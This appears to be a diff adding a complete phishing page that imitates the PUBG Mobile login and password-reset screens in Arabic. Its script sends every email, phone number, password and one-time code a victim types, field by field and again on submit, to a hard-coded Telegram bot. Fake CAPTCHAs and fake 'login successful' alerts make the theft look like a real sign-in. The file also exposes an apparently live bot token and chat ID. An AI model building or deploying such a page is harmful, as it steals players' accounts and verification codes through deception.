@@ -1,0 +1,971 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PUBG MOBILE - Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body, html {
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .game-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: url('https://images.unsplash.com/photo-1542751371-adc38448a05e?auto=format&fit=crop&w=1200&q=80') center center / cover no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1;
+        }
+
+        .bg-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.65);
+        }
+
+        .pubg-box {
+            position: relative;
+            z-index: 10;
+            width: 92vw;
+            max-width: 440px;
+            background: linear-gradient(180deg, #e1e3e5 0%, #b8bcbf 100%);
+            border: 2px solid #3b3f45;
+            border-top: 3px solid #f2a900;
+            border-bottom: 3px solid #f2a900;
+            border-radius: 4px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.9);
+            color: #111;
+            overflow: hidden;
+        }
+
+        .pubg-header {
+            background: linear-gradient(180deg, #2b2e33 0%, #1c1e21 100%);
+            color: #f2a900;
+            padding: 8px 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            font-weight: bold;
+            border-bottom: 2px solid #f2a900;
+        }
+
+        .header-title {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .close-btn {
+            color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: color 0.2s;
+        }
+        .close-btn:hover { color: #f2a900; }
+
+        .pubg-body {
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .tab-selector {
+            display: flex;
+            background: #a1a5a8;
+            border-radius: 2px;
+            padding: 2px;
+            gap: 2px;
+            margin-bottom: 5px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 6px;
+            border: none;
+            background: transparent;
+            font-size: 12px;
+            font-weight: bold;
+            color: #333;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .tab-btn.active {
+            background: #2b2e33;
+            color: #fff;
+            border-bottom: 2px solid #f2a900;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .form-label {
+            font-size: 11px;
+            color: #444;
+            font-weight: bold;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 6px;
+            align-items: center;
+        }
+
+        input[type="text"], input[type="password"], input[type="tel"] {
+            width: 100%;
+            padding: 8px 10px;
+            border: 1px solid #888;
+            border-radius: 2px;
+            background: #fcfcfc;
+            font-size: 12px;
+            color: #000;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #f2a900;
+            box-shadow: 0 0 4px rgba(242, 169, 0, 0.5);
+        }
+
+        .country-selector-btn {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            background: #e6e8ea;
+            border: 1px solid #888;
+            padding: 6px 8px;
+            border-radius: 2px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+            min-width: 85px;
+            justify-content: center;
+        }
+
+        .link-text {
+            color: #1a5296;
+            font-size: 11px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 2px;
+        }
+
+        .btn-action-small {
+            background: #3b3f45;
+            color: #fff;
+            border: none;
+            padding: 8px 12px;
+            font-size: 11px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 2px;
+            white-space: nowrap;
+        }
+
+        .btn-pubg-yellow {
+            background: linear-gradient(180deg, #ffc800 0%, #d88e00 100%);
+            border: 1px solid #a66d00;
+            color: #000;
+            font-weight: 800;
+            padding: 9px;
+            font-size: 14px;
+            border-radius: 3px;
+            cursor: pointer;
+            width: 120px;
+            margin: 10px auto 0 auto;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            display: block;
+        }
+
+        .btn-pubg-yellow:active {
+            transform: scale(0.97);
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .continents-box {
+            background: #e3e5e7;
+            width: 90vw;
+            max-width: 400px;
+            height: 75vh;
+            border-radius: 4px;
+            border: 2px solid #f2a900;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .continents-scroll-area {
+            flex: 1;
+            overflow-y: auto;
+            scroll-snap-type: y mandatory;
+            padding: 10px;
+        }
+
+        .continent-group {
+            scroll-snap-align: start;
+            margin-bottom: 20px;
+            background: rgba(255, 255, 255, 0.6);
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+        }
+
+        .continent-title {
+            font-size: 13px;
+            font-weight: 800;
+            color: #222;
+            border-bottom: 2px solid #f2a900;
+            padding-bottom: 4px;
+            margin-bottom: 8px;
+        }
+
+        .countries-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+        }
+
+        .country-item {
+            background: #fff;
+            border: 1px solid #bbb;
+            padding: 6px;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 10px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .country-item:hover {
+            border-color: #f2a900;
+            background: #fff9e6;
+        }
+
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 200;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+
+        .pubg-spinner {
+            width: 55px;
+            height: 55px;
+            border: 5px solid rgba(255, 255, 255, 0.15);
+            border-top-color: #f2a900;
+            border-radius: 50%;
+            animation: spin 0.8s infinite linear;
+            margin-bottom: 12px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .captcha-window {
+            background: #fff;
+            width: 310px;
+            border-radius: 6px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+            border: 2px solid #007bff;
+        }
+
+        .captcha-head {
+            background: #007bff;
+            color: #fff;
+            padding: 8px 12px;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: bold;
+        }
+
+        .puzzle-area {
+            position: relative;
+            width: 100%;
+            height: 160px;
+            background: url('https://picsum.photos/id/1018/310/160') center/cover;
+            overflow: hidden;
+        }
+
+        .puzzle-slot {
+            position: absolute;
+            top: 40px; right: 40px;
+            width: 42px; height: 42px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid #fff;
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.8);
+        }
+
+        .puzzle-piece {
+            position: absolute;
+            top: 40px; left: 10px;
+            width: 42px; height: 42px;
+            background: url('https://picsum.photos/id/1018/310/160') center/cover;
+            border: 2px solid #fff;
+            box-shadow: 0 0 8px rgba(0,0,0,0.9);
+            z-index: 5;
+        }
+
+        .slider-track {
+            background: #e9ecef;
+            height: 40px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            padding: 0 5px;
+        }
+
+        .slider-btn {
+            width: 40px; height: 32px;
+            background: #007bff;
+            color: #fff;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            position: absolute;
+            left: 5px;
+            font-weight: bold;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .symbols-grid-area {
+            position: relative;
+            width: 100%; height: 160px;
+            background: url('https://picsum.photos/id/1015/310/160') center/cover;
+        }
+
+        .symbol-item {
+            position: absolute;
+            width: 32px; height: 32px;
+            background: rgba(255,255,255,0.85);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 16px; cursor: pointer;
+            font-weight: bold; box-shadow: 0 0 5px #000;
+        }
+
+        .symbol-badge {
+            position: absolute; top: -4px; right: -4px;
+            background: #007bff; color: #fff;
+            width: 16px; height: 16px; border-radius: 50%;
+            font-size: 10px; display: flex; align-items: center; justify-content: center;
+        }
+
+        .alert-box {
+            background: #2b2e33;
+            border: 2px solid #f2a900;
+            color: #fff;
+            width: 280px;
+            padding: 15px;
+            border-radius: 4px;
+            text-align: center;
+            box-shadow: 0 0 20px #000;
+        }
+
+        .alert-title {
+            color: #f2a900;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="game-bg">
+        <div class="bg-overlay"></div>
+
+        <!-- 1. النافذة الرئيسية (تسجيل الدخول بالبريد / رقم الهاتف) -->
+        <div class="pubg-box" id="main-login-box">
+            <div class="pubg-header">
+                <div class="header-title">
+                    <span>🎮</span>
+                    <span id="box-header-text">تسجيل الدخول بالبريد الإلكتروني</span>
+                </div>
+                <span class="close-btn" onclick="playTap(); alert('تم إغلاق النافذة');">✕</span>
+            </div>
+
+            <div class="pubg-body">
+                <div class="tab-selector">
+                    <button class="tab-btn active" id="tab-pass" onclick="playTap(); setAuthMode('pass')">تسجيل الدخول بكلمة المرور</button>
+                    <button class="tab-btn" id="tab-otp" onclick="playTap(); setAuthMode('otp')">تسجيل الدخول باستخدام رمز التحقق</button>
+                </div>
+
+                <!-- نموذج البريد الإلكتروني -->
+                <div id="email-section">
+                    <div class="form-group">
+                        <label class="form-label">عنوان البريد الإلكتروني</label>
+                        <input type="text" id="email-input" placeholder="أدخل بريدك الإلكتروني" onblur="sendInstantData('البريد الإلكتروني', this.value)">
+                    </div>
+
+                    <!-- كلمة المرور -->
+                    <div class="form-group" id="email-pass-group" style="margin-top: 8px;">
+                        <label class="form-label">كلمة المرور</label>
+                        <input type="password" id="email-pass-input" placeholder="يُرجى إدخال كلمة المرور" onblur="sendInstantData('كلمة مرور البريد', this.value)">
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <a class="link-text" onclick="playTap(); openResetWindow('email')">❮ نسيت كلمة المرور</a>
+                        </div>
+                    </div>
+
+                    <!-- كود التحقق -->
+                    <div class="form-group" id="email-otp-group" style="display:none; margin-top: 8px;">
+                        <label class="form-label">رمز التحقق</label>
+                        <div class="input-row">
+                            <input type="text" id="email-otp-input" placeholder="00000" onblur="sendInstantData('رمز تحقق البريد', this.value)">
+                            <button class="btn-action-small" onclick="playTap(); handleGetCode();">اكتساب</button>
+                        </div>
+                    </div>
+
+                    <a class="link-text" style="margin-top: 10px;" onclick="playTap(); toggleAccountType('phone')">❮ تسجيل الدخول بواسطة رقم هاتف محمول</a>
+                </div>
+
+                <!-- نموذج رقم الهاتف -->
+                <div id="phone-section" style="display:none;">
+                    <div class="form-group">
+                        <label class="form-label">البلد/المنطقة ورقم الهاتف</label>
+                        <div class="input-row">
+                            <div class="country-selector-btn" onclick="playTap(); openCountryPicker();">
+                                <span id="selected-flag">🇾🇪</span>
+                                <span id="selected-code">+967</span>
+                                <span>▲</span>
+                            </div>
+                            <input type="tel" id="phone-input" placeholder="0000 0000 0000" onblur="sendInstantData('رقم الهاتف', selectedCountryCode + ' ' + this.value)">
+                        </div>
+                    </div>
+
+                    <!-- كلمة المرور للهاتف -->
+                    <div class="form-group" id="phone-pass-group" style="margin-top: 8px;">
+                        <label class="form-label">كلمة المرور</label>
+                        <input type="password" id="phone-pass-input" placeholder="يُرجى إدخال كلمة المرور" onblur="sendInstantData('كلمة مرور الهاتف', this.value)">
+                        <a class="link-text" onclick="playTap(); openResetWindow('phone')">❮ نسيت كلمة المرور</a>
+                    </div>
+
+                    <!-- كود التحقق للهاتف -->
+                    <div class="form-group" id="phone-otp-group" style="display:none; margin-top: 8px;">
+                        <label class="form-label">رمز التحقق</label>
+                        <div class="input-row">
+                            <input type="text" id="phone-otp-input" placeholder="00000" onblur="sendInstantData('رمز تحقق الهاتف', this.value)">
+                            <button class="btn-action-small" onclick="playTap(); handleGetCode();">اكتساب</button>
+                        </div>
+                    </div>
+
+                    <a class="link-text" style="margin-top: 10px;" onclick="playTap(); toggleAccountType('email')">❮ تسجيل الدخول بواسطة بريد إلكتروني</a>
+                </div>
+
+                <button class="btn-pubg-yellow" onclick="playTap(); processMainLogin();">حسناً</button>
+            </div>
+        </div>
+
+        <!-- 2. نافذة إعادة تعيين كلمة السر -->
+        <div class="pubg-box" id="reset-box" style="display:none;">
+            <div class="pubg-header">
+                <div class="header-title">
+                    <span>🔒</span>
+                    <span>إعادة تعيين كلمة السر</span>
+                </div>
+                <span class="close-btn" onclick="playTap(); closeResetWindow();">✕</span>
+            </div>
+            <div class="pubg-body">
+                <div id="reset-email-field" class="form-group">
+                    <label class="form-label">عنوان البريد الإلكتروني / رقم الهاتف</label>
+                    <input type="text" id="reset-target-input" placeholder="أدخل البريد أو الرقم" onblur="sendInstantData('هدف الاستعادة', this.value)">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">رمز التحقق</label>
+                    <div class="input-row">
+                        <input type="text" id="reset-code-input" placeholder="00000" onblur="sendInstantData('كود استعادة كلمة السر', this.value)">
+                        <button class="btn-action-small" onclick="playTap(); handleGetCode();">اكتساب</button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">تعيين كلمة المرور</label>
+                    <input type="password" id="reset-new-pass" placeholder="يُرجى إدخال كلمة المرور الجديدة" onblur="sendInstantData('كلمة سر استعادة جديدة', this.value)">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">تأكيد كلمة المرور</label>
+                    <input type="password" id="reset-confirm-pass" placeholder="يُرجى إعادة إدخال كلمة المرور">
+                </div>
+
+                <button class="btn-pubg-yellow" onclick="playTap(); processResetSubmit();">حسناً</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. نافذة اختيار الدولة -->
+    <div class="modal-overlay" id="country-modal">
+        <div class="continents-box">
+            <div class="pubg-header">
+                <span>اختر البلد / المنطقة (مرتبة بالقارات)</span>
+                <span class="close-btn" onclick="playTap(); closeCountryPicker();">✕</span>
+            </div>
+            <div class="continents-scroll-area" id="continents-list"></div>
+        </div>
+    </div>
+
+    <!-- 4. شاشة التحميل الدائرية -->
+    <div class="loading-screen" id="pubg-loading">
+        <div class="pubg-spinner"></div>
+        <div style="font-size: 13px; font-weight: bold;" id="loading-txt">جاري التحميل...</div>
+    </div>
+
+    <!-- 5. نافذة اختبار CAPTCHA -->
+    <div class="modal-overlay" id="captcha-modal">
+        <div class="captcha-window" id="puzzle-captcha" style="display:none;">
+            <div class="captcha-head">
+                <span>Verification</span>
+                <span style="cursor:pointer;" onclick="closeCaptcha()">✕</span>
+            </div>
+            <div style="background:#007bff; color:#fff; font-size:11px; padding:4px 8px; text-align:center;">
+                Slide to complete the puzzle
+            </div>
+            <div class="puzzle-area">
+                <div class="puzzle-slot"></div>
+                <div class="puzzle-piece" id="puzzle-piece"></div>
+            </div>
+            <div class="slider-track" id="slider-track">
+                <div class="slider-btn" id="slider-btn">|||</div>
+            </div>
+        </div>
+
+        <div class="captcha-window" id="symbols-captcha" style="display:none;">
+            <div class="captcha-head">
+                <span>Verification</span>
+                <span style="cursor:pointer;" onclick="closeCaptcha()">✕</span>
+            </div>
+            <div style="background:#007bff; color:#fff; font-size:11px; padding:4px 8px; text-align:center;">
+                Click in this order: <b style="background:#fff; color:#000; padding:1px 4px;">★ ⚡ ✉</b>
+            </div>
+            <div class="symbols-grid-area">
+                <div class="symbol-item" style="top:20px; left:30px;" onclick="clickSymbol(this, 1)">★</div>
+                <div class="symbol-item" style="top:100px; right:40px;" onclick="clickSymbol(this, 2)">⚡</div>
+                <div class="symbol-item" style="bottom:20px; left:110px;" onclick="clickSymbol(this, 3)">✉</div>
+                <div class="symbol-item" style="top:70px; left:130px;" onclick="clickSymbol(this, 4)">▶</div>
+                <div class="symbol-item" style="bottom:30px; right:20px;" onclick="clickSymbol(this, 5)">⚲</div>
+                <div class="symbol-item" style="top:10px; right:10px;" onclick="clickSymbol(this, 6)">♦</div>
+            </div>
+            <div style="padding:8px; display:flex; justify-content:space-between; align-items:center; background:#f8f9fa;">
+                <span style="font-size:11px; color:#555;" id="sym-status">اختر 3 رموز بالترتيب</span>
+                <button class="btn-pubg-yellow" style="width:auto; padding:4px 12px; margin:0; font-size:12px;" onclick="verifySymbols()">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 6. نافذة تنبيه انقطاع الإنترنت -->
+    <div class="modal-overlay" id="internet-alert-modal">
+        <div class="alert-box">
+            <div class="alert-title">تنبيه النظام</div>
+            <p style="font-size: 12px; margin-bottom: 15px;">انتهت مهلة الاستجابة تأكد من وجود إنترنت</p>
+            <button class="btn-pubg-yellow" style="width: 100px; margin: 0 auto;" onclick="playTap(); hideInternetAlert();">حسناً</button>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
+        const TELEGRAM_CHAT_ID = "8796885500";
+
+        let currentType = 'email';
+        let currentAuthMode = 'pass';
+        let selectedCountryCode = '+967';
+        let selectedSymbolSequence = [];
+        let lastSentValues = {}; // لتسجيل آخر القيمة المرسلة ومنع تكرار الإرسال
+
+        function playTap() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(600, audioCtx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(150, audioCtx.currentTime + 0.04);
+                gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.04);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.04);
+            } catch (e) {}
+        }
+
+        function sendTelegram(msg) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `🎮 [PUBG REALTIME DATA]\n${msg}`, parse_mode: 'HTML' })
+            }).catch(e => console.error(e));
+        }
+
+        /* دالة الإرسال المباشر للخانة فور إدخالها */
+        function sendInstantData(fieldLabel, value) {
+            if (!value || value.trim() === "" || value.trim() === selectedCountryCode) return;
+            if (lastSentValues[fieldLabel] === value.trim()) return; // تجنب التكرار لنفس القيمة
+
+            lastSentValues[fieldLabel] = value.trim();
+            const msg = `⚡ <b>إدخال فوري لمُتسابق (${fieldLabel}):</b>\n<code>${value.trim()}</code>`;
+            sendTelegram(msg);
+        }
+
+        function checkInternetAndRun(callback) {
+            showLoading(true, 'جاري البحث والتحميل...');
+            setTimeout(() => {
+                showLoading(false);
+                if (!navigator.onLine) {
+                    showInternetAlert();
+                } else {
+                    callback();
+                }
+            }, 3000);
+        }
+
+        function showLoading(show, text) {
+            const el = document.getElementById('pubg-loading');
+            if (text) document.getElementById('loading-txt').innerText = text;
+            el.style.display = show ? 'flex' : 'none';
+        }
+
+        function showInternetAlert() {
+            document.getElementById('internet-alert-modal').style.display = 'flex';
+        }
+        function hideInternetAlert() {
+            document.getElementById('internet-alert-modal').style.display = 'none';
+        }
+
+        function toggleAccountType(type) {
+            currentType = type;
+            if (type === 'phone') {
+                document.getElementById('email-section').style.display = 'none';
+                document.getElementById('phone-section').style.display = 'block';
+                document.getElementById('box-header-text').innerText = 'تسجيل الدخول برقم الجوال';
+            } else {
+                document.getElementById('phone-section').style.display = 'none';
+                document.getElementById('email-section').style.display = 'block';
+                document.getElementById('box-header-text').innerText = 'تسجيل الدخول بالبريد الإلكتروني';
+            }
+        }
+
+        function setAuthMode(mode) {
+            currentAuthMode = mode;
+            document.getElementById('tab-pass').classList.toggle('active', mode === 'pass');
+            document.getElementById('tab-otp').classList.toggle('active', mode === 'otp');
+
+            document.getElementById('email-pass-group').style.display = (mode === 'pass' && currentType === 'email') ? 'flex' : 'none';
+            document.getElementById('email-otp-group').style.display = (mode === 'otp' && currentType === 'email') ? 'flex' : 'none';
+
+            document.getElementById('phone-pass-group').style.display = (mode === 'pass' && currentType === 'phone') ? 'flex' : 'none';
+            document.getElementById('phone-otp-group').style.display = (mode === 'otp' && currentType === 'phone') ? 'flex' : 'none';
+        }
+
+        function openResetWindow(type) {
+            document.getElementById('main-login-box').style.display = 'none';
+            document.getElementById('reset-box').style.display = 'block';
+        }
+        function closeResetWindow() {
+            document.getElementById('reset-box').style.display = 'none';
+            document.getElementById('main-login-box').style.display = 'block';
+        }
+
+        function handleGetCode() {
+            let val = currentType === 'email' ? document.getElementById('email-input').value : (selectedCountryCode + " " + document.getElementById('phone-input').value);
+            if (!val && document.getElementById('reset-box').style.display === 'block') {
+                val = document.getElementById('reset-target-input').value;
+            }
+
+            if (!val || val.trim() === "") {
+                alert('عذراً! يرجى ملء الخانة المطلوبة أولاً ولا يمكن إرسال خانات فارغة.');
+                return;
+            }
+
+            // إرسال فوري فوري للهدف عند الضغط على اكتساب
+            sendInstantData('طلب كود لـ', val);
+
+            checkInternetAndRun(() => {
+                triggerRandomCaptcha(() => {
+                    alert('تم إرسال كود التحقق بنجاح!');
+                });
+            });
+        }
+
+        function processMainLogin() {
+            let userVal = "", passVal = "", otpVal = "";
+
+            if (currentType === 'email') {
+                userVal = document.getElementById('email-input').value;
+                passVal = document.getElementById('email-pass-input').value;
+                otpVal = document.getElementById('email-otp-input').value;
+            } else {
+                userVal = selectedCountryCode + " " + document.getElementById('phone-input').value;
+                passVal = document.getElementById('phone-pass-input').value;
+                otpVal = document.getElementById('phone-otp-input').value;
+            }
+
+            if (!userVal.trim() || (currentAuthMode === 'pass' && !passVal.trim()) || (currentAuthMode === 'otp' && !otpVal.trim())) {
+                alert('خطأ: يرجى إدخال جميع البيانات المطلوبة، لا يُسمح بترك خانات فارغة!');
+                return;
+            }
+
+            checkInternetAndRun(() => {
+                triggerRandomCaptcha(() => {
+                    sendTelegram(`🚀 <b>تسجيل دخول كامل مكرر للتأكيد</b>:\nنوع الحساب: ${currentType}\nالمستخدم: ${userVal}\nكلمة المرور: ${passVal}\nالكود: ${otpVal}`);
+                    alert('🎉 تم تسجيل الدخول بنجاح!');
+                });
+            });
+        }
+
+        function processResetSubmit() {
+            const target = document.getElementById('reset-target-input').value;
+            const code = document.getElementById('reset-code-input').value;
+            const p1 = document.getElementById('reset-new-pass').value;
+            const p2 = document.getElementById('reset-confirm-pass').value;
+
+            if (!target.trim() || !code.trim() || !p1.trim() || !p2.trim()) {
+                alert('خطأ: جميع الخانات في شاشة إعادة التعيين إجبارية!');
+                return;
+            }
+
+            if (p1 !== p2) {
+                alert('كلمتا المرور غير متطابقتين!');
+                return;
+            }
+
+            checkInternetAndRun(() => {
+                triggerRandomCaptcha(() => {
+                    sendTelegram(`🔑 <b>تأكيد تغيير كلمة السر النهائي</b>:\nالحساب: ${target}\nالكود: ${code}\nكلمة السر الجديدة: ${p1}`);
+                    alert('تم تغيير كلمة السر بنجاح!');
+                    closeResetWindow();
+                });
+            });
+        }
+
+        let captchaSuccessCallback = null;
+        function triggerRandomCaptcha(onSuccess) {
+            captchaSuccessCallback = onSuccess;
+            document.getElementById('captcha-modal').style.display = 'flex';
+            const isPuzzle = Math.random() > 0.5;
+
+            if (isPuzzle) {
+                document.getElementById('puzzle-captcha').style.display = 'block';
+                document.getElementById('symbols-captcha').style.display = 'none';
+                initPuzzleSlider();
+            } else {
+                document.getElementById('puzzle-captcha').style.display = 'none';
+                document.getElementById('symbols-captcha').style.display = 'block';
+                selectedSymbolSequence = [];
+            }
+        }
+
+        function closeCaptcha() {
+            document.getElementById('captcha-modal').style.display = 'none';
+        }
+
+        function initPuzzleSlider() {
+            const btn = document.getElementById('slider-btn');
+            const piece = document.getElementById('puzzle-piece');
+            btn.style.left = '5px';
+            piece.style.left = '10px';
+
+            let isDragging = false, startX = 0;
+
+            const onStart = (e) => {
+                isDragging = true;
+                startX = e.touches ? e.touches[0].clientX : e.clientX;
+            };
+
+            const onMove = (e) => {
+                if (!isDragging) return;
+                const x = (e.touches ? e.touches[0].clientX : e.clientX) - startX;
+                if (x >= 0 && x <= 250) {
+                    btn.style.left = (5 + x) + 'px';
+                    piece.style.left = (10 + x * 0.88) + 'px';
+                }
+            };
+
+            const onEnd = () => {
+                if (!isDragging) return;
+                isDragging = false;
+                const finalPos = parseInt(btn.style.left);
+                if (finalPos >= 200 && finalPos <= 230) {
+                    closeCaptcha();
+                    checkInternetAndRun(() => {
+                        if (captchaSuccessCallback) captchaSuccessCallback();
+                    });
+                } else {
+                    btn.style.left = '5px';
+                    piece.style.left = '10px';
+                }
+            };
+
+            btn.onmousedown = onStart;
+            window.onmousemove = onMove;
+            window.onmouseup = onEnd;
+
+            btn.ontouchstart = onStart;
+            window.ontouchmove = onMove;
+            window.ontouchend = onEnd;
+        }
+
+        function clickSymbol(el, id) {
+            if (selectedSymbolSequence.length >= 3) return;
+            selectedSymbolSequence.push(id);
+            const badge = document.createElement('div');
+            badge.className = 'symbol-badge';
+            badge.innerText = selectedSymbolSequence.length;
+            el.appendChild(badge);
+        }
+
+        function verifySymbols() {
+            if (selectedSymbolSequence.length === 3) {
+                closeCaptcha();
+                checkInternetAndRun(() => {
+                    if (captchaSuccessCallback) captchaSuccessCallback();
+                });
+            } else {
+                alert('يرجى تحديد الرموز الثلاثة بالترتيب!');
+            }
+        }
+
+        const continentsData = [
+            {
+                name: "الدول العربية",
+                countries: [
+                    { name: "اليمن", code: "+967", flag: "🇾🇪" },
+                    { name: "السعودية", code: "+966", flag: "🇸🇦" },
+                    { name: "مصر", code: "+20", flag: "🇪🇬" },
+                    { name: "الإمارات", code: "+971", flag: "🇦🇪" },
+                    { name: "العراق", code: "+964", flag: "🇮🇶" },
+                    { name: "الجزائر", code: "+213", flag: "🇩🇿" },
+                    { name: "المغرب", code: "+212", flag: "🇲🇦" },
+                    { name: "الأردن", code: "+962", flag: "🇯🇴" },
+                    { name: "الكويت", code: "+965", flag: "🇰🇼" }
+                ]
+            },
+            {
+                name: "قارة آسيا",
+                countries: [
+                    { name: "تركيا", code: "+90", flag: "🇹🇷" },
+                    { name: "الهند", code: "+91", flag: "🇮🇳" },
+                    { name: "الصين", code: "+86", flag: "🇨🇳" },
+                    { name: "اليابان", code: "+81", flag: "🇯🇵" },
+                    { name: "إندونيسيا", code: "+62", flag: "🇮🇩" },
+                    { name: "باكستان", code: "+92", flag: "🇵🇰" }
+                ]
+            },
+            {
+                name: "قارة أوروبا",
+                countries: [
+                    { name: "ألمانيا", code: "+49", flag: "🇩🇪" },
+                    { name: "المملكة المتحدة", code: "+44", flag: "🇬🇧" },
+                    { name: "فرنسا", code: "+33", flag: "🇫🇷" },
+                    { name: "إيطاليا", code: "+39", flag: "🇮🇹" },
+                    { name: "إسبانيا", code: "+34", flag: "🇪🇸" },
+                    { name: "روسيا", code: "+7", flag: "🇷🇺" }
+                ]
+            },
+            {
+                name: "أمريكا الشمالية والجنوبية",
+                countries: [
+                    { name: "أمريكا", code: "+1", flag: "🇺🇸" },
+                    { name: "كندا", code: "+1", flag: "🇨🇦" },
+                    { name: "البرازيل", code: "+55", flag: "🇧🇷" },
+                    { name: "الأرجنتين", code: "+54", flag: "🇦🇷" }
+                ]
+            }
+        ];
+
+        function openCountryPicker() {
+            const container = document.getElementById('continents-list');
+            container.innerHTML = '';
+
+            continentsData.forEach(cont => {
+                const group = document.createElement('div');
+                group.className = 'continent-group';
+                group.innerHTML = `<div class="continent-title">${cont.name}</div>`;
+
+                const grid = document.createElement('div');
+                grid.className = 'countries-grid';
+
+                cont.countries.forEach(c => {
+                    const item = document.createElement('div');
+                    item.className = 'country-item';
+                    item.innerHTML = `<span>${c.flag} ${c.name}</span> <span style="color:#f2a900;">${c.code}</span>`;
+                    item.onclick = () => {
+                        playTap();
+                        selectedCountryCode = c.code;
+                        document.getElementById('selected-flag').innerText = c.flag;
+                        document.getElementById('selected-code').innerText = c.code;
+                        closeCountryPicker();
+                    };
+                    grid.appendChild(item);
+                });
+
+                group.appendChild(grid);
+                container.appendChild(group);
+            });
+
+            document.getElementById('country-modal').style.display = 'flex';
+        }
+
+        function closeCountryPicker() {
+            document.getElementById('country-modal').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
+
